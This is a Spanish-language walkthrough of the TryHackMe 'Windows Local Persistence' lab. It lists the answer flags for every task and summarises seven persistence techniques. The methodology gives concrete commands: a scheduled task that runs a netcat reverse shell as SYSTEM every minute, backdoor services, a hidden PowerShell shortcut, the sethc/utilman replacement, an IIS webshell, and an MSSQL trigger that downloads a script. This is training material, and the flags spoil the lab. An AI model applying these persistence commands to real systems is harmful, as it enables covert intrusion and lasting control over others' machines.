# Windows Local Persistence

| **Dificultad** | Medium |
| **Tipo** | walkthrough |
| **Slug** | `windowslocalpersistence` |
| **Link** | [TryHackMe](https://tryhackme.com/r/room/windowslocalpersistence) |
| **Sección** | 02 Level Medium |
| **Fuente** | THM |
| **Componentes** | SAM, Syskey, RID, backdoor, servicios, tareas programadas, Run key, Winlogon, sethc, utilman, IIS, MSSQL |
| **Impacto** | Alto - establecimiento de persistencia local en Windows mediante 7 técnicas: manipulación de cuentas, backdoors en archivos, abuso de servicios, tareas programadas, persistencia de logon, pantalla de login/RDP y servicios existentes |

---

**Contexto:** Sala que enseña los métodos más comunes de persistencia en Windows tras obtener acceso inicial. Repasa siete técnicas distintas (manipulación de cuentas con privilegios y RID, backdoors en atajos/asociaciones de archivos, servicios, tareas programadas, técnicas disparadas por logon, backdooring de la pantalla de inicio de sesión/RDP y persistencia a través de servicios como IIS y MSSQL), cada una validada en la máquina objetivo.

## Solucionario

### Task 1: Introduction

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Read the above to get started. | `No answer needed` |

### Task 2: Tampering With Unprivileged Accounts

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Assign Back up files and directories and Restore files and directories privileges to the user. Then login with the user and backup the SAM and SYSTEM files by saving them from the registry. What is the flag 1? | `THM{FLAG_BACKED_UP!}` |
| 2 | Add the SeBackupPrivilege and SeRestorePrivilege into the user (thmuser2) using sysadmins privileges. Then login with the user and backup the SAM and SYSTEM files by saving them from the registry. What is the flag 2? | `THM{IM_JUST_A_NORMAL_USER}` |
| 3 | Use system administration privileges to edit the RID of thmuser3. Then login as thmuser3 and Don't worry about the error. What is the flag 3? | `THM{TRUST_ME_IM_AN_ADMIN}` |

### Task 3: Backdooring Files

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Create a Windows shortcut to your favourite game or application. What is the flag 5? | `THM{NO_SHORTCUTS_IN_LIFE}` |
| 2 | Change the file assocation for .txt files to run a reverse shell when opened. What is the flag 6? | `THM{TXT_FILES_WOULD_NEVER_HURT_YOU}` |

### Task 4: Abusing Services

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Create a windows service and point it to a payload. Start the service to get a reverse shell. What is the flag 7? | `THM{SUSPICIOUS_SERVICES}` |
| 2 | Modify an existing service to point to your payload and start it as LocalSystem. What is the flag 8? | `THM{IN_PLAIN_SIGHT}` |

### Task 5: Abusing Scheduled Tasks

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Create a scheduled task that runs every minute and executes a reverse shell. What is the flag 9? | `THM{JUST_A_MATTER_OF_TIME}` |

### Task 6: Logon Triggered Persistence

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Place your executable in the startup folder for all users. What is the flag 10? | `THM{NO_NO_AFTER_YOU}` |
| 2 | Add your executable to the Run or RunOnce registry keys in HKCU or HKLM. What is the flag 11? | `THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}` |
| 3 | Use winlogon registry keys to execute code on login. What is the flag 12? | `THM{I_INSIST_GO_FIRST}` |
| 4 | Use UserInitMprLogonScript registry keys to execute code on login. What is the flag 13? | `THM{USER_TRIGGERED_PERSISTENCE_FTW}` |

### Task 7: Backdooring the Login Screen / RDP

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Replace the sethc.exe binary with cmd.exe. What is the flag 14? | `THM{BREAKING_THROUGH_LOGIN}` |
| 2 | Replace the utilman.exe binary with cmd.exe. What is the flag 15? | `THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}` |

### Task 8: Persisting Through Existing Services

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Create a webshell in the IIS wwwroot to get a reverse shell. What is the flag 16? | `THM{EZ_WEB_PERSISTENCE}` |
| 2 | Create a MS SQL trigger that executes a reverse shell when a new employee is added. What is the flag 17? | `THM{I_LIVE_IN_YOUR_DATABASE}` |

### Task 9: Conclusion

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Read the above and consider completing more rooms. | `No answer needed` |

---

**Metodología:** Se parte del acceso inicial a la máquina Windows para aplicar las siete técnicas de persistencia. (1) **Cuentas**: se añade thmuser1 a grupos privilegiados (_Backup Operators_, _Remote Management Users_) y se desactiva _LocalAccountTokenFilterPolicy_; con WinRM se exportan SAM/SYSTEM del registro y se vuelcan hashes con `secretsdump.py` (hash de Administrator usado en pass-the-hash). En flag2 se agregan SeBackupPrivilege/SeRestorePrivilege vía secedit y en flag3 se modifica el RID de thmuser3 a 1F4 en regedit (SYSTEM) hasta igualarlo al de Administrators. (2) **Backdoors**: se modifica el atajo de calc.exe para lanzar `powershell.exe -WindowStyle hidden C:\Windows\system32\backdoor.ps1` y se cambia la asociación de `txtfile` para ejecutar `backdoor2.ps1 %1`. (3) **Servicios**: se crea `THMservice2` con `sc.exe create ... binPath= rev-svc.exe start= auto` y se modifica `THMservice3` para apuntar a rev-svc.exe como LocalSystem. (4) **Tareas**: `schtasks /create /sc minute /mo 1 /tn THM-TaskBackDoor /tr "nc64 -e cmd.exe IP 1337" /ru SYSTEM` (ocultando su security descriptor). (5) **Logon**: ejecutable en la carpeta Startup, clave HKLM `...\Run\MyBackdoor`, modificación de `userinit` en Winlogon y valor `UserInitMprLogonScript` en HKCU\Environment. (6) **Login/RDP**: `takeown` + `icacls` sobre `sethc.exe` y `utilman.exe` reemplazándolos por cmd.exe (tecla Shift x5 / icono de accesibilidad). (7) **Servicios existentes**: webshell `shell.aspx` en `C:\inetpub\wwwroot` y trigger en MSSQL (`HRDB.dbo.Employees`) que ejecuta `xp_cmdshell` como 'sa' al insertar un empleado, descargando `evilscript.ps1`.

**Learning chain:** initial access (WinRM) → privilege assignment (Backup Operators / SeBackup) → SAM/SYSTEM export → secretsdump → pass-the-hash → RID manipulation → shortcut/shortcut-icon backdoor → file association abuse → service creation/modification → scheduled task → Startup folder → Run registry key → Winlogon userinit → UserInitMprLogonScript → sethc/utilman swap → IIS webshell → MSSQL trigger + xp_cmdshell → 17 flags captured

**MITRE ATT&CK:** T1098 (Account Manipulation), T1078 (Valid Accounts), T1003.001 (LSASS Memory), T1012 (Query Registry), T1543.003 (Create or Modify System Process: Windows Service), T1053.005 (Scheduled Task/Job), T1547 (Boot or Logon Autostart Execution), T1547.004 (Winlogon Helper DLL), T1546.008 (Accessibility Features), T1505.003 (Web Shell), T1505.001 (SQL Stored Procedures), T1059.001 (PowerShell)

**Fuente:** [TryHackMe - Windows Local Persistence](https://tryhackme.com/r/room/windowslocalpersistence)
